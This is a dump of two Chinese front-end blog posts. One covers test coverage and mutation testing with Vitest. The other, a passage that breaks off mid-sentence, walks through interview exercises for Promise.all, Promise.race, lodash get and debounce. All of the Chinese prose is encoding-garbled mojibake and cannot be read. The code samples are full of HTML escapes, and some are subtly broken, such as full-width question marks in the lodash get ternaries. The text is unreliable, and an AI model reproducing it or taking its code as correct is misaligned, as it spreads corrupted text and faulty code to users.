æˆ‘å€‘å‰‡å¹¾ä¹è¦æŠ•å…¥å…©åˆ°ä¸‰å€ä»¥ä¸Šçš„å¿ƒåŠ›æ‰èƒ½å®Œæˆã€‚\nå› æ­¤ï¼Œæœ‰äº›äººé›–ç„¶æœƒèªç‚º 100% çš„è¦†è“‹ç‡æ˜¯ä¸€å€‹ä¸éŒ¯çš„ç›®æ¨™ï¼Œä½†æ˜¯åœ¨å¯¦éš›ä¸Šï¼Œæˆ‘å€‘å¯èƒ½æœƒå› ç‚ºè¿½æ±‚ 100% çš„è¦†è“‹ç‡è€Œä»˜å‡ºéå¤šçš„å¿ƒåŠ›ï¼Œè€Œå°è‡´æ¸¬è©¦ç¨‹å¼ç¢¼çš„å“è³ªåè€Œè®Šå·®ã€‚\nè¦†è“‹ç‡ 100% çš„èª¤å€ åœ¨è²»ç›¡åƒè¾›è¬è‹¦å¾Œï¼Œæˆ‘å€‘çµ‚æ–¼é”åˆ°äº† 100% è¦†è“‹ç‡çš„æƒ…æ³äº†ã€‚\nç„¶è€Œï¼Œ100 % çš„è¦†è“‹ç‡åƒ…èƒ½ä»£è¡¨æ¸¬è©¦ç¨‹å¼ç¢¼å®Œæ•´ï¼ˆCompleteï¼‰çš„è¦†è“‹äº†ç”¢å“ç¨‹å¼ç¢¼ï¼Œä¸¦éä»£è¡¨æ¸¬è©¦ç¨‹å¼ç¢¼çš„å“è³ªé”åˆ°å®Œç¾ï¼ˆPerfectï¼‰ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘ç”¨å€‹ç°¡å–®çš„ä¾‹å­ä¾†èªªæ˜ï¼š\n1 2 3 4 5 const max = (x, y) =\u0026gt; return x test(\u0026#39;max\u0026#39;, () =\u0026gt; { expect(max(2, 1)).toBe(2) }) åœ¨ä¸Šæ–¹æ¡ˆä¾‹ä¸­ï¼Œæˆ‘å€‘å¯ä»¥çœ‹è¦‹ max æ¸¬è©¦æ¡ˆä¾‹åŸºæœ¬ä¸Šå·²ç¶“å®Œå…¨è¦†è“‹äº† max å‡½å¼çš„å¯¦ä½œæƒ…æ³ï¼Œè€Œæˆ‘å€‘å¯ä»¥å¾é€™å€‹æ¡ˆä¾‹ä¸­çœ‹å‡ºå…©å€‹å•é¡Œï¼š\nç”¢å“ç¨‹å¼ç¢¼æœ¬èº«æœ‰å•é¡Œï¼Œå³ä¾¿æ¸¬è©¦ç¨‹å¼ç¢¼è¦†è“‹äº† 100% çš„æƒ…æ³ä¸‹ï¼Œç”¢å“ç¨‹å¼ç¢¼æœ¬èº«ä»ç„¶æ˜¯æœ‰å•é¡Œçš„ã€‚ æ¸¬è©¦ç¨‹å¼ç¢¼æ¡ˆä¾‹èˆ‡è·¯å¾‘ä¸è¶³ï¼Œå°è‡´è¦†è“‹ç‡ç‚º 100% çš„æƒ…æ³ä¸‹ï¼Œä¸¦æ²’æœ‰æ¸¬å‡ºç”¢å“ç¨‹å¼ç¢¼ä¸­çš„å•é¡Œèˆ‡é‚Šéš›æ¡ˆä¾‹ï¼ˆedge caseï¼‰ã€‚ å› æ­¤è¦†è“‹ç‡ 100% å……å…¶é‡åªæ˜¯ä¸€å€‹æŒ‡æ¨™ï¼Œç”¨ä¾†å‘Šè¨´æˆ‘å€‘æ¸¬è©¦ç¨‹å¼ç¢¼æ˜¯å¦å®Œæ•´çš„è¦†è“‹äº†ç”¢å“ç¨‹å¼ç¢¼ï¼Œè€Œéã€Œå®Œå…¨æ²’æœ‰å•é¡Œã€ã€‚\nå€˜è‹¥æˆ‘å€‘æƒ³è¦ç›¡å¯èƒ½é¿å…é€™ç¨®æƒ…æ³çš„ç™¼ç”Ÿï¼Œé€™æ™‚æˆ‘å€‘å°±å¯ä»¥é€éçªè®Šæ¸¬è©¦ï¼ˆMutation Testingï¼‰ä¾†å”åŠ©æˆ‘å€‘ã€‚\nçªè®Šæ¸¬è©¦ï¼ˆmutation testingï¼‰ çªè®Šæ¸¬è©¦ï¼ˆMutation Testingï¼‰æ˜¯ä¸€ç¨®é©—è­‰èˆ‡æ”¹å–„æ¸¬è©¦ç¨‹å¼ç¢¼çš„æ¸¬è©¦æ–¹æ³•ï¼Œæ¦‚å¿µä¸Šä¾†èªªï¼Œä»–æœƒç›¡å¯èƒ½çš„æŠ½æ›ç”¢å“ç¨‹å¼ç¢¼ä¸­çš„æ¯å€‹è§’è½ï¼Œæ¥è‘—ä¾ç…§æŠ½æ›è¦å‰‡ä¾†é æœŸæ¸¬è©¦ç¨‹å¼ç¢¼çš„æª¢æ¸¬çµæœã€‚\nå‡è¨­æˆ‘å€‘æœ‰å€‹æ¯”è¼ƒå‡½å¼å¦‚ä¸‹ï¼š\n1 const greaterThan = (x, y) =\u0026gt; x \u0026gt; y è€Œé€™æ™‚æˆ‘å€‘æ¸¬è©¦ç¨‹å¼ç¢¼å¯èƒ½æœƒé€™éº¼è™•ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;should return true if x is greater than y\u0026#39;, () =\u0026gt; { expect(greaterThan(2, 1)).toBe(true) expect(greaterThan(0, -1)).toBe(true) expect(greaterThan(100, 0)).toBe(true) }) it(\u0026#39;should return false if x is less than y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 2)).toBe(false) expect(greaterThan(-1, 0)).toBe(false) expect(greaterThan(0, 100)).toBe(false) }) æ¥è‘—çªè®Šæ¸¬è©¦å¯èƒ½æœƒå°‡ greaterThan å‡½å¼ä¸­çš„ \u0026gt; ç¬¦è™Ÿæ›¿æ›æˆ \u0026gt;= ç¬¦è™Ÿï¼Œæ­¤æ™‚ç†è«–ä¸Šä¾†èªªæ‡‰è©²æœƒæœ‰æ¸¬è©¦æ¡ˆä¾‹å¤±æ•—ï¼Œä½†æ˜¯å¯¦éš›ä¸Šæ¸¬è©¦ç¨‹å¼ç¢¼å»æ²’æœ‰æª¢æ¸¬åˆ°é€™å€‹å•é¡Œï¼Œé‚£å°±è¡¨ç¤ºæˆ‘å€‘çš„æ¸¬è©¦ç¨‹å¼ç¢¼ä¸¦æ²’æœ‰è¦†è“‹åˆ°é€™å€‹æ¡ˆä¾‹ã€‚\næ­¤æ™‚æˆ‘å€‘å°±å¯ä»¥é‡å°é€™ç¨®æƒ…æ³ï¼Œå†è£œä¸Šå°æ‡‰çš„æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 it(\u0026#39;should return true if x is greater than y\u0026#39;, () =\u0026gt; { expect(greaterThan(2, 1)).toBe(true) expect(greaterThan(0, -1)).toBe(true) expect(greaterThan(100, 0)).toBe(true) }) it(\u0026#39;should return false if x is less than y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 2)).toBe(false) expect(greaterThan(-1, 0)).toBe(false) expect(greaterThan(0, 100)).toBe(false) }) // æ–°å¢æ¡ˆä¾‹ it(\u0026#39;should return false if x is equal y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 1)).toBe(false) }) æ¥è‘—çªè®Šæ¸¬è©¦å†åº¦å°‡ \u0026gt; ç¬¦è™Ÿæ›¿æ›æˆå„ç¨®ç¬¦è™Ÿï¼ˆe.g. \u0026lt;=ï¼‰ï¼Œç”šè‡³æ˜¯å°‡ {} èªå¥ï¼ˆstatementï¼‰æ¸…ç©ºï¼Œè€Œè«¸å¦‚æ­¤é¡çš„æ‰‹æ³•ï¼Œå°±æ˜¯çªè®Šæ¸¬è©¦çš„æ ¸å¿ƒæ¦‚å¿µã€‚\nè‹¥æƒ³æ‰‹å‹•ç½®æ›ç”¢å“ç¨‹å¼ç¢¼ä¸­çš„ç¬¦è™Ÿï¼Œå¯ä»¥å¾é€™äº›æ–¹æ³•ä¸‹æ‰‹\noperator: +, -, *, / condition: \u0026lt;, \u0026gt;, \u0026lt;=, \u0026gt;=, ==, ===, !=, !== statement: {}, if, else, for, return, throw, try, catch expression: \u0026amp;\u0026amp;, ||, ! çªè®Šæ¸¬è©¦çš„å·¥å…· é›–ç„¶èªªæˆ‘å€‘å¯ä»¥æ‰‹å‹•ç½®æ›ç”¢å“ç¨‹å¼ç¢¼ä¸­çš„å„ç¨®ç¬¦è™Ÿï¼Œä½†æ˜¯é€™æ¨£çš„ä½œæ³•æœƒè®“æˆ‘å€‘çš„å·¥ä½œé‡è®Šå¾—éå¸¸é¾å¤§ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥é€éå·¥å…·ä¾†å”åŠ©æˆ‘å€‘å®Œæˆé€™äº›å·¥ä½œã€‚\nä»¥å‰ç«¯é ˜åŸŸä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥é€é Stryker Mutator åº•ä¸‹çš„ stryker-js å·¥å…·ä¾†å®Œæˆé€™äº›å·¥ä½œã€‚\nStryker Mutator çš„æ¦‚å¿µå°±æ˜¯é€éæ›¿æ›ä¸åŒçš„ç¬¦è™Ÿç”¢ç”Ÿå‡ºçªè®Šçš„å…§å®¹ï¼Œè€Œæˆ‘å€‘çš„æ¸¬è©¦ç¨‹å¼ç¢¼æ‡‰è©²è¦æ•æ‰åˆ°é‚£äº›ä¸åˆç†çš„æƒ…æ³ï¼Œè—‰æ­¤ä¾†ä¿è­‰æˆ‘å€‘çš„æ¸¬è©¦æ¡ˆä¾‹æœ‰ä¸€å®šçš„ç©©å›ºæ€§ã€‚\nç„¶è€Œï¼Œå¯æƒœçš„æ˜¯ stryker-js ç›®å‰åƒ…æ”¯æ´åˆ° Jest ç’°å¢ƒï¼Œå°šæœªæ”¯æ´ Vitest çš„ç’°å¢ƒï¼Œå› æ­¤æˆ‘é€™é‚Šå°±æš«ä¸åšä»‹ç´¹äº†ï¼Œæœ‰èˆˆè¶£è€…å¯ä»¥è¿½è¹¤è©² issue ç›®å‰çš„æœ€æ–°é€²åº¦ã€‚\n","date":"2022-12-29T00:00:00Z","image":"https://madewithnetworkfra.fra1.digitaloceanspaces.com/spatie-space-production/29079/vitest.jpg","permalink":"https://wayneblog.ga/2022-12-29/vitest-unit-test/","title":"é—¡è¿°å–®å…ƒæ¸¬è©¦ã€å…ƒä»¶æ¸¬è©¦ï¼Œä¸¦å­¸ç¿’åœ¨è‡ªå·±çš„ Vue3 å°ˆæ¡ˆä¸­åŠ å…¥ Vitestï¼"},{"content":" åƒè€ƒç¶²ç«™\nå‰ç«¯æ‰‹å¯«é¡Œæ˜¯è¨±å¤šé¢è©¦æœƒè€ƒçš„é¡Œå‹ï¼Œå¾æœ€åŸºæœ¬ä¸Šçš„å„é¡æ•ˆç”¨å‡½å¼ (ä¾‹å¦‚ debounceã€curryã€deepClone ç­‰ç­‰)ï¼Œåˆ°å¸¸è¦‹çš„ JavaScript æ–¹æ³• (ä¾‹å¦‚ Promise.all)ï¼Œéƒ½ä¸èƒ½åªæœƒç”¨ï¼Œé‚„è¦æœƒè‡ªå·±æ‰‹å¯«å‡ºä¾†ã€‚\næœ¬ç¯‡æ–‡ç« å°‡æœƒç¯€éŒ„å¸¸è¦‹çš„æ‰‹å¯«é¡Œç›®ï¼Œä¸¦é™„ä¸Šè§£ç­”ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ¯ä¸€é¡Œéƒ½æœ‰è©³ç´°è§£èªªï¼Œä¾›è®€è€…å€‘åƒè€ƒã€‚\nPromise.all Promise.all() æ˜¯ä»€éº¼ï¼Ÿ è¦å¯¦ç¾é€™å€‹æ–¹æ³•å‰ï¼Œæˆ‘å€‘è¦å…ˆçŸ¥é“å®ƒåœ¨åšä»€éº¼ã€‚æ ¹æ“š MDN çš„å®šç¾©ï¼ŒPromise.all() æœƒï¼š\næ¥æ”¶ä¸€å€‹å…§æœ‰å¤šå€‹ promises çš„ Iterable ï¼Œä¾‹å¦‚ Arrayã€Mapã€Setã€‚ å¦‚æœ Iterable æ˜¯ç©ºçš„ï¼Œä¾‹å¦‚ç©º Arrayï¼Œå‰‡ fulfilled å€¼æœƒæ˜¯ç©ºçš„ Arrayã€‚ å¦‚æœ Iterable ä¸æ˜¯ç©ºçš„ï¼Œå‰‡å¦‚æœæ‰€æœ‰çš„ promises éƒ½ fulfilledï¼Œå‰‡ä¾åºå›å‚³ fulfilled çš„å€¼ï¼›å¦‚æœå…¶ä¸­æœ‰ä¸€å€‹ promise è¢« rejectedï¼Œå‰‡æœƒé¦¬ä¸Š rejectã€‚ 1 2 3 4 5 6 7 8 9 10 const promise1 = Promise.resolve(3); const promise2 = 42; const promise3 = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 100, \u0026#39;foo\u0026#39;); }); Promise.all([promise1, promise2, promise3]).then((values) =\u0026gt; { console.log(values); }); // expected output: Array [3, 42, \u0026#34;foo\u0026#34;] å¦‚ä½•å¯¦ç¾ç°¡å–®ç‰ˆçš„ Promise.all() åœ¨å¯¦ç¾å®Œæ•´ç‰ˆä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä»¥ä¸€å€‹åƒ…è™•ç† Array çš„ Promise.all ç‚ºä¾‹å­ï¼Œäº†è§£å¦‚ä½•å¯¦ç¾æ ¸å¿ƒæ¦‚å¿µï¼Œå¾€ä¸‹å†é€²ä¸€æ­¥æ¢è¨å¦‚ä½•è™•ç† Iterableã€‚æˆ‘å€‘å…ˆç›´æ¥çœ‹ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹ä½ èƒ½äº†è§£å¤šå°‘ã€‚æœ‰ä¸æ‡‚çš„åœ°æ–¹ä¹Ÿä¸æ“”å¿ƒï¼Œä¸‹é¢æœƒé€éè¨»è§£ï¼Œä¸€è¡Œè¡Œè§£é‡‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function promiseAll(promises) { if (!Array.isArray(promises)) { return new TypeError(\u0026#39;Arguments must be an array\u0026#39;); } if (promises.length === 0) { return Promise.resolve([]); } const outputs = []; let resolveCounter = 0; return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { outputs[index] = value; resolveCounter += 1; if (resolveCounter === promises.length) { resolve(outputs); } }) .catch(reject); }); }); } è®“æˆ‘å€‘é€éä»¥ä¸‹ç¨‹å¼ç¢¼èˆ‡è¨»è§£ä¾†çœ‹å¦‚ä½•å¯¦ç¾å§ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function promiseAll(promises) { // å…ˆæª¢æŸ¥è¼¸å…¥æ˜¯ä¸æ˜¯ arrayï¼Œå¦‚æœä¸æ˜¯çš„è©±å°±å›å‚³éŒ¯èª¤ if (!Array.isArray(promises)) { return new TypeError(\u0026#39;Arguments must be an array\u0026#39;); } // å®šç¾©ä¸­æœ‰æåˆ°ï¼Œå¦‚æœè¼¸å…¥æ˜¯ç©ºçš„ï¼Œä¾‹å¦‚ç©º arrayï¼Œå°± resolve ä¸€å€‹ç©º array if (promises.length === 0) { return Promise.resolve([]); } // å…ˆå®£å‘Šä¸€å€‹æœ€çµ‚è¦ resolve çš„ outputsï¼Œä¹‹å¾Œæ¯å€‹ promise è¢« fulfilled æ™‚ï¼Œå°±æ”¾åˆ° outputs è£¡é¢ const outputs = []; // æˆ‘å€‘éœ€è¦é€™å€‹ counter è®“æˆ‘å€‘çŸ¥é“æœ‰å¤šå°‘å€‹ promise å·²ç¶“ fulfilled let resolveCounter = 0; // Promise.all() æœ€çµ‚è¦å›å‚³ä¸€å€‹ promise return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { // ç•¶è¼¸å…¥çš„æ¯å€‹ promise æˆåŠŸ fulfilled æ™‚ï¼Œå°±æ”¾åˆ° outputs // é€é indexï¼Œæˆ‘å€‘å¯ä»¥ç¢ºä¿é †åºæ­£ç¢º outputs[index] = value; // æ¯æ¬¡æˆåŠŸæ”¾å…¥æ™‚ï¼Œcounter è¦åŠ ä¸€ resolveCounter += 1; // ç•¶ counter ç­‰æ–¼ promises çš„é•·åº¦æ™‚ï¼Œä»£è¡¨æ‰€æœ‰çš„ promise éƒ½ fulfilled // é€™æ™‚æœ€å¤–é¢çš„ promise å°±å¯ä»¥ resolve if (resolveCounter === promises.length) { resolve(outputs); } }) .catch(reject); // å¦‚æœæœ‰ä»»ä½•ä¸€å€‹ rejectï¼Œå°±ç›´æ¥ reject }); }); } å¯¦ç¾å®Œæ•´ç‰ˆçš„ Promise.all() ä¸Šé¢é€™å€‹ç‰ˆæœ¬çš„ Promise.all() åªæœ‰è™•ç† Array é€™ç¨®è¼¸å…¥ï¼Œä½†å¯¦éš›ä¸Šçš„ Promise.all() æ˜¯èƒ½æ¥æ”¶æ‰€æœ‰çš„ Iterableï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥é€²ä¸€æ­¥å„ªåŒ–ä¸Šé¢çš„ç‰ˆæœ¬(å‚™è¨»ï¼šåœ¨é¢è©¦ä¸­èƒ½å¯«å‡ºä¸Šé¢çš„ç‰ˆæœ¬ï¼ŒåŸºæœ¬ä¸Šè¦éé—œæ˜¯æ²’å•é¡Œï¼Œç•¶ç„¶å¦‚æœæƒ³åœ¨é¢è©¦ä¸­å±•ç¾è‡ªå·±çš„ç´°å¿ƒåº¦ï¼Œé‚£éº¼é€²ä¸€æ­¥å„ªåŒ–æ˜¯æ›´å¥½çš„é¸æ“‡)ã€‚\nå…ˆæƒ³æƒ³ï¼Œå¦‚æœè¦è™•ç†ä»»æ„çš„ Iterable å¯ä»¥æ€éº¼åšï¼Ÿæˆ‘å€‘å¯ä»¥å…ˆåˆ¤æ–·ä¸Ÿé€²ä¾†çš„è¼¸å…¥æ˜¯ä¸æ˜¯å¯ä»¥è¿­ä»£çš„ï¼Œå¦‚æœä¸æ˜¯çš„è©±ï¼Œå°±ææ—©å›å‚³éŒ¯èª¤ã€‚\n1 2 3 4 5 6 7 const isIterable = ((typeof promises === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; promises !== null) || typeof promises === \u0026#39;string\u0026#39;) \u0026amp;\u0026amp; typeof promises[Symbol.iterator] === \u0026#39;function\u0026#39;; if (!isIterable) { return new TypeError(\u0026#39;Arguments must be iterable\u0026#39;); } åŸºæœ¬ä¸Šå¤šäº†ä¸Šè¿°æ­¥é©Ÿçš„è™•ç†ï¼Œå‰©ä¸‹çš„é‚è¼¯å°±è·Ÿ Array ç‰ˆæœ¬çš„å·®ä¸å¤šï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹(ä¸åŒä¹‹è™•æœƒæœ‰è¨»è§£)ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 function promiseAll(promises) { // åˆ¤æ–·è¼¸å…¥æ˜¯å¦ç‚º Iterable const isIterable = ((typeof promises === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; promises !== null) || typeof promises === \u0026#39;string\u0026#39;) \u0026amp;\u0026amp; typeof promises[Symbol.iterator] === \u0026#39;function\u0026#39;; // ä¸æ˜¯çš„è©±å°±å›å‚³éŒ¯èª¤è¨Šæ¯ if (!isIterable) { return new TypeError(\u0026#39;Arguments must be iterable\u0026#39;); } // æŠŠ Iterable è½‰æˆ Arrayï¼Œå°±å¯ä»¥é‡è¤‡ç”¨ Array ç‰ˆçš„é‚è¼¯ promises = Array.from(promises); if (promises.length === 0) { return Promise.resolve([]); } const outputs = []; let resolveCounter = 0; return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { outputs[index] = value; resolveCounter += 1; if (resolveCounter === promises.length) { resolve(outputs); } }) .catch((e) =\u0026gt; { // æˆ–æ˜¯åªè¦æœ‰ reject çš„ï¼Œå°±é¦¬ä¸Š reject reject(e); }); }); }); } Promise.race() Promise.race() æ˜¯ä»€éº¼ï¼Ÿ è¦å¯¦ç¾é€™å€‹æ–¹æ³•å‰ï¼Œæˆ‘å€‘è¦å…ˆçŸ¥é“å®ƒåœ¨åšä»€éº¼ã€‚æ ¹æ“š MDN çš„å®šç¾©ï¼ŒPromise.race() æœƒ\næ¥æ”¶ä¸€å€‹å…§æœ‰å¤šå€‹ promises çš„ Iterableï¼Œä¾‹å¦‚ Arrayã€Mapã€Set å›å‚³æœ€å…ˆ fulfill æˆ–æœ€å…ˆè¢« reject çš„é‚£ä¸€å€‹ å¦‚ä½•å¯¦ç¾ Promise.race() æˆ‘å€‘å…ˆç›´æ¥çœ‹ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹ä½ èƒ½äº†è§£å¤šå°‘ã€‚æœ‰ä¸æ‡‚çš„åœ°æ–¹ä¹Ÿä¸æ“”å¿ƒï¼Œä¸‹é¢æœƒé€éè¨»è§£ï¼Œä¸€è¡Œè¡Œè§£é‡‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 function promiseRace(promises) { return new Promise((resolve, reject) =\u0026gt; { for (const p of promises) { p.then((val) =\u0026gt; { resolve(val); }).catch((e) =\u0026gt; { reject(e); }); } }); } è®“æˆ‘å€‘é€éä»¥ä¸‹ç¨‹å¼ç¢¼èˆ‡è¨»è§£ä¾†çœ‹å¦‚ä½•å¯¦ç¾å§ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function promiseRace(promises) { return new Promise((resolve, reject) =\u0026gt; { // è¿­ä»£é promises for (const p of promises) { p.then((val) =\u0026gt; { // åªè¦æœ‰ fulfill çš„ï¼Œå°±é¦¬ä¸Š resolve resolve(val); }).catch((e) =\u0026gt; { // æˆ–æ˜¯åªè¦æœ‰ reject çš„ï¼Œå°±é¦¬ä¸Š reject reject(e); }); } }); } Lodash çš„ .get() Lodash çš„ .get() åœ¨åšä»€éº¼ï¼Ÿ .get() æ˜¯å¾ˆå¸¸è¢«ç”¨åˆ°çš„ä¸€å€‹æ•ˆç”¨å‡½å¼ï¼Œä»–åšçš„äº‹æƒ…æ˜¯çµ¦å®šä¸€å€‹ç‰©ä»¶ï¼Œä»¥åŠæŸå€‹è·¯å¾‘ï¼Œè¦å›å‚³æ­¤è·¯å¾‘çš„å€¼ï¼›å¦‚æœè©²è·¯å¾‘ä¸å­˜åœ¨æ–¼çµ¦å®šçš„ç‰©ä»¶ï¼Œå‰‡è¿”å›é è¨­å€¼ã€‚é€éä¾‹å­æœƒæ¯”è¼ƒå¥½ç†è§£ (ä»¥ä¸‹ä¾‹å­ä¾†è‡ª Lodash åŸå§‹ç¢¼)\n1 2 3 4 5 6 7 8 9 10 const object = { a: [{ b: { c: 3 } }] }; //=\u0026gt; 3 get(object, \u0026#39;a[0].b.c\u0026#39;); //=\u0026gt; 3 get(object, \u0026#39;a[0][\u0026#34;b\u0026#34;][\u0026#34;c\u0026#34;]\u0026#39;); //=\u0026gt; \u0026#39;default get(object, \u0026#39;a[100].b.c\u0026#39;, \u0026#39;default\u0026#39;); å¾ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹åˆ° Lodash é€™å€‹å‡½å¼åº«ï¼Œå¯ä»¥æ¥æ”¶å„ç¨®é¡å‹çš„è·¯å¾‘ï¼Œä¸»è¦æ˜¯åŸå§‹ç¢¼ç•¶ä¸­æœ‰ castPath é€™å€‹ helper functionã€‚castPath æœƒæŠŠä¸Šé¢çš„ \u0026quot;a[0].b.c\u0026quot;ã€'a[0][\u0026quot;b\u0026quot;][\u0026quot;c\u0026quot;]' ä»¥åŠ \u0026quot;a[100].b.c\u0026quot; éƒ½è½‰æˆå¥½è™•ç†çš„ ['a', '0', 'b', 'c']ã€‚\nå› æ­¤ï¼Œå¦‚æœçµ¦å®šæœ‰å…§å»ºçš„ castPathï¼Œ.get() å¯¦éš›åœ¨åšçš„äº‹æƒ…æ˜¯ï¼š\n1 2 3 4 5 // çµ¦å®šä¸€å€‹ç‰©ä»¶ï¼Œä¾‹å¦‚ const object = { a: [{ b: { c: 3 } }] }; // çµ¦ä¸€å€‹è·¯å¾‘ï¼Œé€é .get() æ‰¾åˆ°è©²è·¯å¾‘çš„å€¼ï¼Œä¾‹å¦‚ get(object, [\u0026#39;a\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]); // å›å‚³ 3 å¦‚ä½•å¯¦ç¾ .get() ä¸€èµ·ä¾†çœ‹çœ‹å¦‚ä½•å¯¦ç¾ .get()ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function lodashGet(object, path, defaultValue) { // å…ˆç¢ºèªå‚³é€²ä¾†çš„ object ä¸æ˜¯ nullï¼Œå¦‚æœæ˜¯å‰‡ç›´æ¥å›å‚³ defaultValue if (object == null) { return defaultValue; } let count = 0; const length = path.length; // ä¾å¾ªè·¯å¾‘ä¸€å±¤å±¤èµ°éè©²ç‰©ä»¶ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œæœƒæ˜¯ // path[0] ç‚º \u0026#39;a\u0026#39;ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¿´åœˆ object æœƒè®Šæˆ object[\u0026#39;a\u0026#39;] ä¹Ÿå°±æ˜¯ [{ b: { c: 3 } }] // ç¬¬ä¸€æ¬¡è¿´åœˆå¾Œï¼Œcount åŠ  1ï¼Œæ‰€ä»¥è®Šæˆ object[path[1]] // ä¹Ÿå°±æ˜¯ [object[\u0026#39;0\u0026#39;]]ï¼Œæ„å³ { b: { c: 3 } } // æ¥è‘— count å†åŠ ä¸€ï¼Œæ‰€ä»¥ object æœƒæˆç‚º object[path[2]] // ä¹Ÿå°±æ˜¯ object[\u0026#39;b\u0026#39;]ï¼Œæ„å³ { c: 3 } // æ¥è‘— count å†åŠ ä¸€ï¼Œæ‰€ä»¥ object æœƒæˆç‚º object[path[3]] // ä¹Ÿå°±æ˜¯ object[\u0026#39;c\u0026#39;]ï¼Œæ„å³ 3 // é€™æ™‚ count ç‚º 4ï¼Œç”±æ–¼ length ä¹Ÿæ˜¯ 4ï¼Œå› ç‚º 4 ä¸å°æ–¼ 4ï¼Œæ‰€ä»¥è·³å‡ºè¿´åœˆ while (object != null \u0026amp;\u0026amp; count \u0026lt; length) { object = object[path[count++]]; } // å› ç‚ºä¸Šé¢å¦‚æœ object æ˜¯ null çš„è©±ï¼Œåœ¨èµ°å®Œ length é•·åº¦å‰ï¼Œå°±æœƒè·³å‡º while è¿´åœˆ // é€™ç¨®æƒ…æ³ä¸‹ï¼Œå°±ä»£è¡¨ä¾å¾ªè©²è·¯å¾‘ï¼Œæœƒæ‰¾ä¸åˆ°å€¼ï¼Œæ‰€ä»¥æœƒæ˜¯ undefined // èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœ path æ˜¯ [\u0026#39;a\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;] // å› ç‚º object[\u0026#39;1\u0026#39;] æœƒæ˜¯ undefinedï¼Œæ‰€ä»¥é€™æ™‚ while è¿´åœˆæœƒåœ¨ count ç‚º 2 æ™‚çµ‚æ­¢ // é€™ç¨®æƒ…æ³ä¸‹å°±æœƒæ˜¯ count \u0026lt; lengthï¼Œæ‰€ä»¥ç•¶ count \u0026lt; lengthï¼Œresult æœƒæ˜¯ undefined const result = count \u0026amp;\u0026amp; count == length ï¼Ÿ object : undefined; // å¦‚æœ result æ˜¯ undefinedï¼Œä»£è¡¨ä¾å¾ªè©²è·¯å¾‘ï¼Œæœƒæ‰¾ä¸åˆ°å€¼ï¼Œæ‰€ä»¥å›å‚³é è¨­å€¼ // å¦‚æœä¾å¾ªè·¯å¾‘æœ‰æ‰¾åˆ°å€¼ï¼Œå°±å›å‚³ result return result === undefined ï¼Ÿ defaultValue : result; } é˜²æŠ–å‡½å¼(debounce) é˜²æŠ–(debounce) å’Œç¯€æµ(throttle) çµ•å°æ˜¯åœ¨è€ƒæ‰‹å¯«é¡Œæ™‚æœ€å¸¸å‡ºç¾çš„å‰å¹¾åï¼Œé€™å…©è€…éƒ½èƒ½åšåˆ°å„ªåŒ–ï¼Œä½†ä½¿ç”¨æƒ…å¢ƒä¸å¤ªç›¸åŒã€‚\né˜²æŠ–(debounce)åœ¨åšä»€éº¼ï¼Ÿ é˜²æŠ–å‡½å¼(debounce)æ˜¯æŒ‡ï¼Œå°‡å¤šæ¬¡æ“ä½œå„ªåŒ–ç‚ºï¼šåªåœ¨æœ€å¾Œä¸€æ¬¡åŸ·è¡Œã€‚\nå…·é«”ä¾†èªªï¼Œç•¶ä¸€å®šæ™‚é–“å…§æ²’æœ‰æŒçºŒè§¸ç™¼äº‹ä»¶æ™‚ï¼Œäº‹ä»¶è™•ç†å‡½å¼æ‰æœƒè¢«åŸ·è¡Œä¸€æ¬¡ï¼Œä½†å¦‚æœåœ¨è¨­å®šçš„æ™‚é–“å…§åˆä¸€æ¬¡è§¸ç™¼äº†äº‹ä»¶ï¼Œå°±æœƒé‡æ–°é–‹å§‹è¨ˆæ™‚ã€‚\nåœ¨æ‰‹å¯«**é˜²æŠ–(debounce)**å‡½å¼å‰ï¼Œæˆ‘å€‘å…ˆä¾†äº†è§£é˜²æŠ–çš„ä½¿ç”¨æƒ…å¢ƒã€‚\næˆ‘å€‘ä»¥ Google 